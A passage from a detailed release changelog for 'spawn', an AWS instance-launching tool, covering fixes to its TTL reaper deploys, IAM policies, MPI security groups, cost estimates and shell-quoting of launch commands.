  `/var/log/spawn-command.log`** — the log a user actually reads — saying the command
  never started, rather than running it against missing data and producing silently
  wrong output. It also writes a failed completion record, so `--on-complete` still
  fires instead of the instance billing to its TTL doing nothing.
  Two details are load-bearing and gated by tests. The wait is **inside** the
  backgrounded subshell: waiting outside it would block cloud-init, so `spored` would
  never start and TTL/idle/cost enforcement would stay unarmed for the duration — the
  spored#65 failure, worse than the bug being fixed. And the MPI gate is signalled
  **before** the rank-0 `mpirun`, not after: that `mpirun` is the job and can run for
  hours, so gating on it would make `--command` wait out the entire run.
  Gates are declared only where a producer is certain to signal one, because the
  expensive direction is a gate nobody writes: that would stall every launch for the
  full 600s timeout and then fail one that works today.

- **The auto-created MPI security group was TCP-only, so EFA could not pass traffic at
  all** (#659). `CreateOrGetMPISecurityGroup` authorized only `tcp` 0-65535 from itself.
  EFA's Scalable Reliable Datagram is not TCP, so the fabric was blocked outright — and
  this is a hard failure rather than a slowdown: GCHP/MAPL **aborts at
  `MPI_Win_create`** when the one-sided transport is unavailable instead of falling back,
  so an EFA launch simply died.
  The rules are now self-referential **all-protocol** (`IpProtocol: "-1"`), ingress and
  egress. Egress is set explicitly even though a new group already has a permissive
  default rule — which is why this went unnoticed — because AWS documents EFA as
  requiring it, and anyone who tightens that default otherwise loses the fabric with no
  indication why.
  Existing groups are **backfilled**: the reuse path returned a found group without
  looking at its rules, so every `spawn-mpi-*` group created before this kept only the
  old TCP rule and upgrading spawn would have fixed nothing. The only workaround was
  deleting the group by hand, which fails while any instance still references it. The
  rule check now runs on every launch and tolerates already-present rules.
  (The other half of #659 — the managed group discarding `--security-group-ids` — was
  fixed with #667.)
- **`--mpi-command` only worked for commands with no arguments** (#660). The template
  rendered it through `shellEscape`, which is `strconv.Quote`, wrapping the whole command
  in **one pair of double quotes** — so `--mpi-command "./gchp --flag x"` reached
  `mpirun` as a single argv word and it tried to exec a binary of that literal name.
  `strconv.Quote` is also Go escaping *inside double quotes*, where `$VAR`, command
  substitution and backticks still expand, so it preserved neither argv nor safety.
  A command line is meant to be parsed by a shell at run time, so it is no longer
  interpolated into the generated script at all: it is written to
  `/etc/spawn/mpi-command` through a quoted here-doc (nothing expands while writing, the
  text lands byte-exact) and run with `mpirun … bash /etc/spawn/mpi-command`.
- **`--estimate-only` ignored `--count`** (#662). It printed the per-instance rate times
  the TTL, so a 2-node cohort quoted **$7.66/hr against a real ceiling of $15.31**. That
  is the wrong direction to be wrong in: the flag exists to bound spend before committing,
  and it is reached by users who are being careful — the same class as the FSx omission
  fixed in #613. Above one instance the estimate now shows the per-instance rate *and*
  the total, for both the hourly figure and the TTL cost. A `--count` of 1 (the default)
  prints exactly what it did before, and a nonsensical count is clamped rather than
  multiplying the estimate to `$0.00`.

- **The #650 deploy fix disarmed the live production reaper; fixed properly** — follow-up
  to #650. The Makefile's `describe-stacks` call had **no `--region`**, so it resolved
  against the profile's default region, the stack read as "not found", the `|| echo '[]'`
  branch wrote an empty live set, and every parameter fell back to its **template
  default** — including `DryRun`, whose default is `true`. The reaper went to dry-run:
  still running, still reporting, terminating nothing. Exactly the failure #650 was
  written to prevent, reintroduced by the fix for it.
  What let it past review was the **reporting**: the merge printed *"deploy changes no
  parameters (code only)"*, because its change notes only fired when a live value existed
  to differ from. With no live values there were no notes, so asserting all 16 defaults
  looked identical to inheriting all 16.
  Three changes, in order of what actually matters: every `aws cloudformation` call in the
  deploy path is now region-explicit (`REGION?=us-east-1`); a `describe-stacks` failure
  that is **not** a genuinely absent stack now **aborts** instead of degrading to an empty
  live set; and an empty live set is now the **loudest** case, warning that every value
  comes from a template default and listing each one as a change.
  Tests cover all three, including one that reads the Makefile — the region bug isn't
  visible in the merge logic at all, it's in the call that feeds it.
  The production stack was restored from a snapshot taken before the bad deploy: all 16
  parameters match the original with zero drift, `DryRun=false`, DNS sweep on, and all
  five alarms re-wired.

- **The `ssm:SendCommand` grant added in #652 could not actually authorize** — follow-up
  to #652, caught by policy simulation against the live role before anyone relied on it.
  The statement scoped `ssm:SendCommand` with `ec2:ResourceTag/spawn:managed`. **A
  condition key belongs to the service of the ACTION, not of the resource**:
  `ec2:ResourceTag` is an EC2 key and is simply absent from the request context of an
  `ssm:*` call, so the `StringEquals` never matches and the statement is an implicit
  **deny**. Simulated against the deployed role: `SendCommand` on a `spawn:managed`
  instance evaluated `implicitDeny` with the `ec2:` key and `allowed` with
  `ssm:resourceTag`. So the action was granted, #652's drift gate passed, and
  `REAPER_GRACEFUL` still could not send a command — the exact failure #652 set out to
  fix, one layer deeper.
  This is the same trap as the `fsx:ResourceTag` vs `aws:ResourceTag` distinction that
  #652's *own* changelog entry described. Fails closed and silently, which is what makes
  it worth a gate rather than a fix.
  `TestConditionKeysBelongToTheirActionsService` now fails any statement whose
  service-prefixed condition key doesn't match its action's service (`aws:` being the
  global namespace, valid anywhere). #652's gate checked which actions were *granted*;
  it could not see whether a grant could *authorize*.

### Security

- **`security.ShellEscape` is not shell-safe, and no longer claims to be** (#660, audit
  tracked in #680). It is `strconv.Quote`, i.e. Go/C escaping inside **double** quotes —
  where a POSIX shell still expands `$VAR`, command substitution and backticks — so it
  neutralises none of them, while also collapsing a multi-word value into one argv word.
  Its doc comment previously said it "handles all special shell characters".
  A correct `security.ShellQuote` (single-quoting, with `'\''` for an embedded quote) is
  now available and used by the storage-gate mount-point list; `ShellEscape` is marked
  deprecated with the remaining call sites enumerated in #680. The most notable is
  `spawn config set`, where a value containing `$(…)` is executed on the instance
  instead of stored — self-inflicted, since the caller already owns the box, but still
  wrong. Two places in the tree had already worked around this with their own quoting
  and comments explaining why, which is how the pattern surfaced.

## [0.117.0] - 2026-10-04

### Added

- **`results_prefix` on the TaskSpec: put a task's durable records where you want them**
  (#646). `outputs[].destination` was always fully caller-controlled — per object, to any
  bucket, with the launch role's policy built from whatever the spec names — but
  `completion.json`, `.exitcode` and `command.log` always landed at
  `s3://spawn-results-<account>-<region>/tasks/<task_id>/` with no override. A consumer
  wanting its own layout therefore read **two** places: its own prefix for results, and
  the fixed spawn path for the terminal signal.
  Set `results_prefix` to an `s3://bucket/prefix` and the records follow, so it becomes
  one read. Omitting it changes nothing — the default is byte-identical to before, which
  matters because six workflow adapters poll that path literally.
  `spawn task status` gains `--results-prefix`, because it is given a task id rather
  than a spec and so cannot infer where a spec sent its records. Without the flag it
  stays on spawn's default, where every existing task's records are.
  **spawn will not create a bucket you named.** It creates its own default bucket before
  launch so a first-ever task can't hit `NoSuchBucket`; for a caller-supplied bucket a
  missing one is an error instead, because a typo would otherwise leave a stray bucket
  behind and still report the run as a success.
  The prefix is now resolved once by the caller and passed to the wrapper, the flush hook
  (#632) and the instance policy, rather than each deriving it from an account and
  region — so a future override can't reach one and miss another.

### Changed

- **`spawn terminate` is now idempotent when the instance is already gone** (#648).
  Three states already satisfy its goal of "this instance is not running" — an unknown
  **name**, already terminated, already shutting down — and all three used to exit 1.
  They now exit 0 with a clear message. **This is a behaviour change**: a script that
  relied on a non-zero exit to detect a missing *name* will now see success.
  An unknown instance **ID** deliberately still fails. An ID is opaque and AWS-assigned,
  so one that matches nothing is a typo rather than an already-cleaned-up resource, and
  exiting 0 there would let someone believe they stopped a still-billing instance.
  It is worth it because the old behaviour actively misled. An executor's cleanup ran
  `terminate` after a launch had already failed and reported *"the instance may still be
  running and billing until its TTL"* — the one sentence a user cannot ignore — when
  nothing had been created and nothing had leaked. The already-terminated case is if
  anything more common, since `on_complete: terminate` means a successful task's instance
  is usually gone before an executor gets around to cleaning up.
  Scoped deliberately to `terminate`: the shared instance resolver is used by ~10
  commands (`connect`, `dns`, `config`, `extend`, …) where a non-existent instance
  genuinely is an error, so only this command opts in, via a sentinel rather than
  error-string matching. A test asserts no other command starts doing the same.

- **A 22 MiB compiled binary is no longer tracked in git** (#637).
  `lambda/autoscale-orchestrator/autoscale-orchestrator` was the one name missing
  from `.gitignore`'s hand-maintained per-lambda list, so it was tracked and
  mutable: a plain `go build ./...` in that module — which CI itself runs on every
  lambda module — rewrote it, and `git add -A` then staged a 22 MiB diff. No
  user-facing behaviour change; it is build output that was never meant to be
  committed, and was in fact a **macOS (Mach-O) build**, so it could never have run
  on Lambda's `provided.al2023`/arm64 to begin with. Removing it from `HEAD` does
  not shrink existing clones — the bytes stay in history — but it stops the bleeding.
  Two new gates replace the hand-maintained list as the real protection: one fails
  if **any** tracked file is a compiled executable (matched by magic bytes, not
  `file` output, which calls every shell and Python script "executable"), and one
  fails if a Go lambda module is missing its `.gitignore` entry — so the next lambda
  cannot reintroduce this by being forgotten.

### Fixed

- **`REAPER_GRACEFUL` now works in the cross-account deployment** (#652). The reaper's
  graceful path asks `spored` to shut down cleanly over SSM before the external
  terminate, but in cross-account mode — which is the production configuration — those
  calls run under the assumed `spawn-ttl-reaper-ec2` role, and that role granted **no
  `ssm:` actions at all**. #625 added them to the Lambda's *own* execution role, which
  covers scan-self only, so the asymmetry inverted rather than closing.
  It degraded quietly rather than dangerously: `tryGracefulPreStop` is best-effort and
  the terminate after it always runs, so the hard-deadline guarantee (#72) held
  throughout — graceful mode just silently became an immediate hard kill.
  The #625 drift gate only ever read the scan-self policy, which is exactly why this
  survived it. It now checks **both** roles against the same discovered call set, and a
  second test fails if either role grants something the other doesn't.
  `ssm:SendCommand` is scoped to `spawn:managed` instances plus the one
  `AWS-RunShellScript` document; `ssm:GetCommandInvocation` takes no resource ARN.

- **`make deploy` for the TTL reaper no longer resets every setting it was not told
  about** (#650). It asserted all 13 of its own Makefile defaults on every run, so the
  command in `lambda/ttl-reaper/README.md` would have set `DryRun=true` on the live
  production stack — **disarming the reaper**. That is the worst failure mode available
  to a cost backstop: it keeps running, keeps reporting, and merely stops terminating
  anything, so nothing looks wrong until an instance outlives its TTL. The same deploy
  would also have turned DNS sweep off, blanked the hosted-zone and domain, and detached
  the alarm topic — silencing every failure alarm in the stack, including the
  not-invoked alarm that exists to catch a reaper that stopped running.
  Deploy now **reads the live stack first**: an unspecified parameter keeps whatever is
  deployed, anything passed explicitly still gets through, and a fresh stack falls back
  to the template defaults. So redeploying for new code is a bare `make deploy`, which
  reports `deploy changes no parameters (code only)`. Any parameter that *would* change
  is printed before the deploy runs.
  Verified against the real production stack read-only: all 16 parameters inherited with
  **zero drift** and `DryRun=false` preserved. Also now covers `MaxAge`, `Regions` and
  `Schedule`, which the Makefile previously omitted entirely and left to
  `UsePreviousValue`.
  The irony worth recording: the Makefile's own comments carefully explain the
  *opposite* hazard — an omitted parameter becomes `UsePreviousValue` and is therefore
  unreachable, which is why #438 could not be enabled from `make deploy`. Passing
  everything explicitly fixed that and created this. Read-then-write fixes both.

- **Concurrent `spawn task run` launches no longer fail on IAM `ConcurrentModification`**
  (#648). Two launches ~60 ms apart — the normal case for any workflow executor fanning
  out independent processes — raced on `CreateInstanceProfile`, and one died with
  `ConcurrentModification: The previous tagging operation is still ongoing`, taking a
  whole Nextflow DAG with it.
  The call was already wrapped in the `retryIAM` backoff added for #64; the gap was its
  **predicate**. `ConcurrentModification` is neither "already exists" nor throttling, so
  `retryIAM` returned on the *first* attempt without ever sleeping — the opposite of what
  IAM asks for. It is now retried on the existing 500 ms × attempt backoff. Genuine
  errors like `AccessDenied` still fail fast on the first attempt rather than waiting out
  five sleeps.
  This is the **common** concurrent-launch failure, not a rare one: every
  `CreateRole`/`CreateInstanceProfile` on the launch path passes `Tags`, and it is that
  implicit tagging operation which serialises. It was also first-run-only — once the
  profile exists the window closes — which made it easy to dismiss as a blip.
  `SetupSporedIAMRole` was hardening the same concern a second time by hand (three
  un-retried calls tolerating only `EntityAlreadyExists`/`LimitExceeded` by string
  match), so the #64 fix never reached it. All three now route through `retryIAM` and
  inherit the behaviour instead of reimplementing it, with a test that fails if a new
  `Create*` call is added outside the retry.

- **A task whose manifest uses a top-level path (`/out`, `/data`, `/work`) now works**
  (#564). The wrapper pre-creates every bind-mount directory specifically so that
  `docker run -v` never auto-creates a missing one as root — but it did so with a plain
  `mkdir -p`, running as the *unprivileged* instance user, which cannot create a
  directory at the filesystem root. The failure was then **swallowed**: stage-in
  reported success, `docker -v` created the directory as root mode 0755, and the
  container hit `Permission denied` ninety seconds later with nothing pointing at the
  real cause. spawn's own documented `/data` + `/work` example could not work, and
  `/tmp` was in practice the only usable staging location.
  Mount-dir creation now tries the unprivileged `mkdir` first and escalates to
  `sudo mkdir` + a `chown` to the invoking uid only when that fails, so no privilege is
  used where none is needed. A directory that cannot be created now fails the task **at
  stage-in**, classified `staging_error`, instead of running the command against an
  unwritable mount.
  Confirmed on a real t4g.medium before and after: `/out/results` went from
  `drwxr-xr-x 2 0 0` (root) to `drwxr-xr-x 2 1000 1000`, and a directory output now
  stages recursively to S3 including its subdirectory. A code read could not catch this
  — the `mkdir` is emitted either way; only a real instance shows it returning non-zero.
  The chown is deliberately gated on the directory not already existing: a destination
  of `/tmp/staged.bin` yields a mount dir of `/tmp`, and chowning *that* would strip the
  sticky ownership the whole instance depends on.

- **Lambda deployments no longer upload the whole source directory** (#645). The three
  SAM-deployed lambdas used `CodeUri: .` (or, for `pipeline-orchestrator`, no `CodeUri`
  at all), and `sam deploy` zips that directory with **no filtering of any kind** — every
  file, dotfiles included. There is no `.samignore` feature in the SAM CLI and
  `.gitignore` is not consulted, so #637's work kept the stray dev binary out of git
  without keeping it out of the *deployment package*. Each build now goes to a dedicated
  `build/` directory holding nothing but `bootstrap`, with `CodeUri` pointed explicitly
  at it.
  Measured with SAM's own zipper: `ttl-reaper` drops from a **75.7 MiB** deployed package
  to **25.2 MiB** (one entry). `autoscale-orchestrator` (7.8 MiB) and
  `pipeline-orchestrator` (17.1 MiB) were not inflated in their last deploys but had the
  same latent exposure — the next deploy from a dirty tree would have inflated them.
  Two things were riding along besides the dev binary: a nested `function.zip` holding a
  *second* copy of `bootstrap` (already compressed, hence near-incompressible — which is
  why 96 MB of files only squeezed to 75.7 MiB), and, after any release build,
  GoReleaser's `ttl-reaper_lambda_linux_arm64.zip`.
  **The part that mattered more than size:** `ttl-reaper`'s Makefile generates
  `.deploy-params.yaml` immediately before `sam deploy`, holding every deploy parameter
  including the `NotifyUrl` Slack webhook. Because SAM uploads dotfiles, that file would
  have shipped inside the deployment package, readable by anyone with
  `lambda:GetFunction`. Nothing was leaked — the webhook was empty in practice — but
  `make deploy NOTIFY_URL=...` is the documented usage, so it was a live trap. A test now
  fails if that file (or the Makefile's `PARAMS_FILE`) is ever inside a `CodeUri`
  directory.
  Published artifact layout is unchanged: the release zip still has `bootstrap` at its
  root, which `spawn reaper deploy` (#625) depends on.

### Documentation

- **Corrected a misleading comment about tag-conditioning FSx deletes** (#652).
  `pkg/reaperiam` read as though `fsx:DeleteFileSystem` could not be tag-conditioned at
  all, while the cross-account role tag-conditions it — an apparent contradiction. There
  isn't one: they refer to **different condition keys**. FSx exposes no *service* key
  `fsx:ResourceTag` for the action, but the *global* `aws:ResourceTag/${TagKey}` does
  work. Confirmed by IAM policy simulation — with the tag present and `"true"` the call
  is `allowed`; absent, or present and `"false"`, it is `implicitDeny`.
  The scan-self policy deliberately does **not** adopt the condition yet. The simulation
  proves IAM *evaluates* the key; it cannot prove FSx *populates* it at request time,
  since the simulator takes that context from the caller. If FSx doesn't supply it the
  condition fails closed — deletes denied and filesystems leak, which is the safe
  direction but still a regression. Cross-account already carries that dependency;
  extending it to the path #625 exists to make work needs a real ephemeral-FSx reap
  first (#613).

- **`spawn task run --help` now explains what gets bind-mounted, as whom, and where
  staging space actually comes from** (#620). The old text said only "the manifest dirs
  are bind-mounted", which reads as though any path works for any image — and the gap
  cost a reporter real debugging time, then led to a set of workarounds that are no
  longer necessary.
  It now states that spawn pre-creates the parent of every `inputs[].destination` and
  `outputs[].source` as the instance user and runs the container as that same `uid:gid`
  rather than the image's declared `USER` (#555), chowning staged inputs so they can be
  deleted as well as read (#565) — so any absolute path works, the image's `USER` is
  irrelevant, and staged paths do **not** need to be kept flat in `/tmp`.
  It also documents the trap that `resources.disk_gib` sizes the **root EBS volume**, so
  it is the knob for an ordinary path like `/work`, while `/tmp` on AL2023 is a tmpfs
  capped near half of instance memory — staging a 40 GiB index into `/tmp` fails on a
  32 GiB box no matter how large `disk_gib` is. Since sizing for a staging footprint in
  memory tends to pick the instance *family* rather than just its size, the two choices
  are not interchangeable on cost.

## [0.116.0] - 2026-10-03

### Fixed
- **A task killed by its own TTL now leaves a completion record and its log** (#632).
  Previously it left *nothing* — no `completion.json`, no `command.log`, no task
  prefix in the results bucket at all. Both of those are written by the on-instance
  wrapper *after* the user command, in sequence, so they only ever ran if the command
  returned; when a lifecycle limit fired mid-command the log died with the disk. That
  is the one failure mode where diagnostics matter most, and the most likely to recur,
  because sizing a TTL tightly is the recommended practice: one reporter lost a
  45-minute run and had no way to tell how far it got, so the next attempt's TTL was
  another blind guess.
  `spored` now runs a terminal-flush hook on **every** exit path it mediates —
  *before* it stops or terminates the instance, while the network is still up — which
  uploads `command.log` and writes a record naming the limit that fired. Because it
  hangs off the pre-stop path rather than the TTL check, it also covers the identical
  gap for a **cost-limit** kill, an **idle stop**, and a **spot interruption**.
  The record is `state: "failed"` with `exit_code: -1` (the process never returned a
  status) plus a new `terminal_reason` field — `ttl_expired`, `cost_limit_exceeded`,
  `idle_timeout` or `spot_interruption` — and `retry_class` is now populated for the
  two classes that were already reserved for it. There is deliberately **no new
  `state` value**: `state` is documented `completed | failed` and six workflow
  adapters parse that object, so a third value would send every one of them down a
  default branch. `terminal_reason` is additive and `omitempty`, so older readers
  ignore it and pre-#632 records still parse.
  What this does **not** cover, to be clear: an instance killed without `spored`'s
  involvement — a direct `terminate-instances`, an out-of-band reaper, or host
  failure. There is no pre-stop path to hang the flush off there.
  Thanks to the reporter, whose `spawn_phase()` timings were exactly the thing worth
  salvaging.
- **Exec-based task-wrapper tests no longer race across packages** (#642). Four tests
  ran a generated script and then read the record it wrote at one hardcoded absolute
  path, which `pkg/taskproto` and `pkg/taskpool` both wrote — and `go test ./...` runs
  packages in parallel, so whichever script finished last decided what the other
  package's test read. It reproduced 3/3 and passed 3/3 on the same commit depending
  only on test-cache state, which is the worst kind of red: it reads as "your change
  broke the wrapper" on whatever unrelated PR happens to lose. The local artifact
  directory is now resolved at generation time (still `/tmp` in production, which is
  load-bearing — `spored` shares the host `/tmp`, see #66) and tests point it at a
  per-binary temp directory. Deliberately *not* a runtime environment variable: the
  wrapper and the flush hook are generated separately and run as separate processes,
  and the hook uses the wrapper's record path as its "don't overwrite a finished task"
  interlock, so letting the two disagree at runtime would be strictly worse than the
  flake.
- **`spawn extend` now carries the cost limit along with the TTL** (#639). It moved
  `spawn:ttl` and `spawn:ttl-deadline` and nothing else, while `spored` enforces the
  cost cap independently — first-to-fire wins. So for anyone who sized their cap to
  their TTL, which is what the cost guidance tells you to do, `extend` was a **no-op by
  construction**: the limit just left alone was always the tighter one. One reporter
  extended a 60m TTL by 45m and the instance still stopped at ~61m, one minute after
  the *original* deadline, with nothing in the output mentioning the cap — so it read
  as "extend didn't work" rather than "a second limit fired".
  The cap is now raised to exactly what the new deadline requires — rate × hours from
  launch, including the EBS rate, computed from the instance's own tags so it cannot
  disagree with what is enforced — and the change is printed with both numbers and the
  reason. It only ever raises. `--cost-limit` sets a value explicitly;
  `--keep-cost-limit` extends the TTL and leaves the cap alone, saying so in the output.
  Extending a **job array** still does not change cost limits, but now warns and names
  the per-instance command that does.

### Changed
- **`--cost-limit` now covers storage, not just compute** (#616). It was compute-only,
  which is how a `--cost-limit 2.50` launch in #613 committed a 1.2 TiB filesystem at
  ~$174/month — roughly 70x the cap — while the cap was respected to the letter the
  whole time. The cap is now a total, enforced in the two places it can be:
  - **Up front:** a launch whose storage alone exceeds the cap is **refused**, naming
    the real monthly figure and why the cap can't bound it. Pass
    `--allow-cost-limit-overrun` if you mean it. **This is a behaviour change** — a
    launch that succeeded yesterday under a small cap with `--fsx-create` will now be
    rejected, which is the bug, not a regression.
  - **In flight:** `spored` now counts **EBS** toward the cap as well as compute, priced
    on wall clock rather than compute time — a stopped instance still pays for its
    volumes, and the old arithmetic counted none of it.
  FSx is deliberately *not* in the in-flight tally: terminating doesn't delete a
  filesystem, so firing the cap on it would look like enforcement and achieve nothing.
  That commitment is refused at launch instead, and reclaiming what outlives an
  instance remains the reaper's job (#624/#625).
  The `--estimate-only` preview and `spawn status` no longer say the cap excludes
  storage; they now state what it can and cannot *reclaim*, which is the part that
  didn't change.

- **The changelog policy is now enforced in CI rather than by habit.** A PR that
  changes Go source without touching `CHANGELOG.md` fails, and the `[Unreleased]`
  section is checked for duplicate group headings, invalid group names, entries with
  no group, and releases missing a compare link. Both halves had already broken: one
  PR merged with no entry at all — found only at the next release, which hit an empty
  `[Unreleased]` and had to reconstruct the entries from the diff at tag time — and
  three PRs each inserting their own `### Added` left duplicate headings, which merge
  cleanly for git and badly for Keep a Changelog, twice needing consolidation by hand.
  Format checks are scoped to `[Unreleased]`: a dozen shipped releases already carry
  duplicate groups, and gating frozen history would mean either rewriting released
  notes or a permanently-red test. The presence check asks the GitHub API what the PR
  changed rather than diffing a shallow clone, which cannot find a merge base.

## [0.115.0] - 2026-10-02

### Added
- **`spawn reaper deploy` runs the TTL reaper inside your own AWS account** (#625),
  with no cross-account trust anywhere. The reaper's normal shape is a Lambda in
  spore.host's infra account that assumes a role in yours — which requires your
  account to trust an external principal, and many organizations forbid that
  outright. Those accounts previously had **no backstop at all**: `spored` enforces
  TTL from inside each instance, so nothing reclaimed a *stopped* instance past its
  deadline or a filesystem that outlived its instance. One sat stopped for 13 days,
  still billing EBS.
  **It deploys unarmed.** The schedule runs and logs what it *would* reclaim while
  touching nothing, until you run `spawn reaper arm` — so you can read a cycle
  against your own account's tagging before granting the power to terminate, which is
  how spawn's own reaper was rolled out. `spawn reaper status` reports deployed /
  armed / schedule, and `spawn reaper teardown` removes it.
  Re-deploying an **armed** reaper does not silently disarm it, and `spawn doctor`
  reports the account as covered immediately afterwards (#624) — verified end to end
  on a real account: `⚠ not covered` → deploy → `✓ in-account reaper` → dry-run scan
  → arm → a 1-minute-TTL instance reclaimed with
  `REAPED i-… — ttl-deadline` in the reaper's own log → teardown → `⚠` again.

- **The ttl-reaper Lambda is now published as a release asset**
  (`ttl-reaper_lambda_linux_arm64.zip`, #625). Nothing could install the reaper
  before: it was deployed by hand from a CFN template in this repo, so an account
  whose organization forbids cross-account trust — where the reaper's normal
  "assume a role in your account" model is unavailable — had no way to get a backstop
  at all. Publishing the artifact is the prerequisite for `spawn reaper deploy`.

### Fixed
- **A reaper scanning its own account could not delete orphaned FSx filesystems or
  shut instances down gracefully** (#625). Its execution policy granted
  `ec2:Describe*`/`TerminateInstances` and **no `fsx:` or `ssm:` actions**, while the
  reaper's code calls `fsx:DescribeFileSystems`/`DeleteFileSystem` (the #210
  ephemeral-orphan net) and `ssm:SendCommand`/`GetCommandInvocation` (graceful
  shutdown). In cross-account mode those run under the assumed role, which does grant
  FSx — so the gap only ever affected the scan-its-own-account mode, and affected it
  **silently**: instances were terminated correctly while the orphaned 1200 GiB
  filesystem that #613 was reported for was quietly left behind. The permission set
  now lives in one place (`pkg/reaperiam`) with a test that reads the reaper's own API
  interfaces and fails if any call lacks a grant — the structural end of the class
  behind #622 and lagotto #149/#151/#153.

## [0.114.0] - 2026-10-02

### Added
- **`spawn status` now lists every billable resource the launch is paying for**, not
  just the instance (#615) — EBS, an FSx Lustre filesystem, an EFS mount — with the
  rate for each and an explicit note that **`--cost-limit` caps compute only**.
  Resources that keep billing after the instance is gone are marked as such, with the
  commands to find and delete them. This is the general form of #613's lesson: the
  filesystem was the most expensive thing in that launch and the least visible thing
  in the tooling, and `spawn status` — the one surface a user checks to answer "what
  am I paying for" — was silent about it. A stopped instance's EBS is called out as
  **still billing** while the compute row says it is not, since "stopped to save
  money" is the quietest version of the same surprise. Rates come from the tags spawn
  already writes, so the view cannot drift from what `--cost-limit` is enforced
  against, and an unpriced instance reads "rate unknown" rather than implying $0.
  The block is omitted when the instance is the only billable thing.

- **A launch that depends on the out-of-band reaper warns when none covers the
  account** (#624), before anything is spent and including under `--dry-run` /
  `--estimate-only`. It fires only where coverage changes the outcome:
  `--on-complete stop`/`hibernate`, where the instance's EBS keeps billing and `spored`
  cannot act once stopped; and `--fsx-lifecycle ephemeral`, where only the reaper ever
  deletes the filesystem (a 1200 GiB minimum, ~$174/month). A plain
  `--on-complete terminate` does **not** warn, since `spored` handles that from inside
  and the reaper is only its backstop — warning there would recreate the noise this
  change removes.

### Changed
- **`spawn status`'s reaper line now points at `spawn doctor`** instead of saying
  "if deployed for your account". Coverage became detectable in #624, so the hedge
  was pointing at a question that now has an answer — and the comment justifying it
  cited the hardcoded stub #624 replaced. `spawn status` stays free of the two extra
  AWS calls; it names the command that answers definitively.

### Fixed
- **`spawn service`'s documented form now always works, and a misparse says why**
  (#621). `spawn service python3 -m worker.serve --ttl 1h` failed with
  `unknown shorthand flag: 'm' in -m` — naming a flag the user never passed to spawn,
  so it reads as a spawn bug rather than a missing `--`. The help's examples put
  spawn's flags *after* the command, which worked only because none of them carried a
  flag of its own; they now show the form that always works (spawn's flags first,
  then `--`, then your command), including commands like `python3 -m app.serve` and
  `uvicorn app:app --port 0` that used to break. A flag-parse error now also names the
  fix with a copyable example.
  **Not changed:** the parser itself. Making everything after the command positional
  (cobra's `SetInterspersed(false)`) would have silently turned
  `spawn service ./srv --ttl 2h` into running `./srv --ttl 2h` with **no TTL on the
  instance** — trading a loud error for an untimed, billing instance. The previously
  documented flags-after-command form still works for commands without their own
  flags.

- **`spawn doctor`'s reaper check now tells you something** (#624). It was a hardcoded
  "not detected" that printed the *same* warning in every account — covered or not — so
  it carried no information, and a warning that always fires is one people learn to
  scroll past. An account where nothing reclaims expired instances read exactly like a
  healthy one; that is how a TTL-expired instance billed for 13 days without anyone
  noticing. Coverage is now detected from the two signals it actually leaves: a reaper
  Lambda running in the account, or the conventional `spawn-ttl-reaper-ec2` role
  granting one elsewhere access. Verified against three real accounts, which report
  covered-in-account, covered-cross-account and not-covered respectively.
  "Could not determine" is now also distinct from "there is none" — the check no longer
  asserts an absence it cannot prove.

### Documentation
- **`docs/durable-storage-fsx.md` says how to check coverage, and what the
  "everything dies eventually" invariant actually promises** — that it holds in two
  layers, and that in an uncovered account it degrades to whatever `spored` manages
  before it stops or dies.

## [0.113.0] - 2026-10-01

### Fixed
- **`--on-complete` now actually fires for a `--command` launch** (#614). Nothing on
  that path ever signalled completion — only `spawn task run` did — so an instance
  ran to its full TTL whether the command succeeded or failed, despite
  `--on-complete terminate` being the documented way to bound batch cost. One
  reporter's box idled 38 minutes after its command died in the first second.
  **This is a behaviour change you will notice:** instances that used to sit until TTL
  now take their `--on-complete` action when the command exits. If you relied on the
  old behaviour to keep a box around, use `--on-complete stop` or omit the flag.
- **A failed `--command` is no longer reported as a success.** The command was run as
  a background job and its exit code discarded, so `✅ Command execution started`
  printed regardless — and a command that 403'd on its first line looked like a clean
  launch. The exit code is now captured (from `PIPESTATUS`, since `$?` after the log
  pipe is `tee`'s status and is `0` even on failure), written to
  `/tmp/SPAWN_EXITCODE`, and reported as a pass/fail line once it is actually known.

### Added
- **`--s3-read` and `--s3-write`** (both repeatable) grant a launch's instance access
  to the S3 buckets you name (#614). A launch instance could previously only reach
  spawn's own buckets, so a `--command` reading your own bucket got a 403 — and the
  only ways out were `--iam-policy s3:ReadOnly`, which grants read on *every* bucket
  in the account, or `AmazonS3FullAccess`. `spawn task run` already derives a
  least-privilege policy from its spec's declared inputs and outputs; these flags give
  `spawn launch` the same declarative capability, using the same policy builder.
  Wildcards, ARNs and `s3://` URIs are refused, since the name goes straight into a
  Resource ARN.

### Documentation
- **`--command`'s help now states what the instance actually is**: the command runs on
  the bare instance as the login user (not root — use `sudo`), and Docker and fuse are
  **not** installed, unlike on a `spawn task run` instance. All three cost #614's
  reporter a run to discover.

## [0.112.2] - 2026-10-01

### Security
- **Bumped OpenTelemetry to v1.45.0** to clear
  [GO-2026-6505](https://pkg.go.dev/vuln/GO-2026-6505), reported against
  `go.opentelemetry.io/otel/exporters/otlp/otlptrace` and `otlptracehttp` at
  v1.44.0. The advisory was published after v0.112.1 was tagged, so `main` went red
  on it with no code change of ours. Bumped in the root module and in the two lambda
  modules that carry otel transitively.

### Fixed
- **`--fsx-import-path` now actually imports your data** (#622). On a fresh
  filesystem the S3 data-repository association failed every time with *"Amazon FSx
  is unable to create Service-Linked-Role to access the S3 bucket"*: FSx creates a
  per-filesystem service-linked role on the first association, which needs the
  calling principal to hold `iam:CreateServiceLinkedRole`, and the instance role
  didn't have it. Because the mount proceeds anyway by design, the result was a
  mounted but **empty** 1200 GiB filesystem — the FSx Lustre minimum, ~$174/month —
  while the CLI printed `🎉 Instance Ready!` and the workload read an empty
  directory. The grant is now part of spored's baseline, scoped by condition to the
  one FSx-S3 service principal. It looked account-specific only because the role
  persists once created, so anyone who had ever made an association by hand never
  saw it. The grant was missing on **both** instance-profile paths — including the
  one a launch with no `--iam-*` flags takes, i.e. the simplest invocation — so both
  are fixed and a test pins them together.
- **A failed S3 association is no longer visible only on the instance.**
  `spawn status` now reports it — which filesystem, the underlying error, and that
  the filesystem is billing either way with the commands to list and delete it.
  Previously it existed solely as a line in `/var/log/spored.log`.
- **The association failure now says what actually broke.** The log line read
  "results may not auto-export to S3", which is fair for an export failure and badly
  misleading for an import one: with `--fsx-import-path` the association is how the
  data *arrives*, so the real outcome is an empty filesystem. The message now names
  the consequence for the paths you actually gave.

## [0.112.1] - 2026-10-01

### Fixed
- **`spawn` no longer crashes when it looks at an FSx filesystem that is still
  being created** (#618). Resolving a filesystem by id during `launch` or
  `task run` dereferenced its DNS name, Lustre mount name and storage capacity
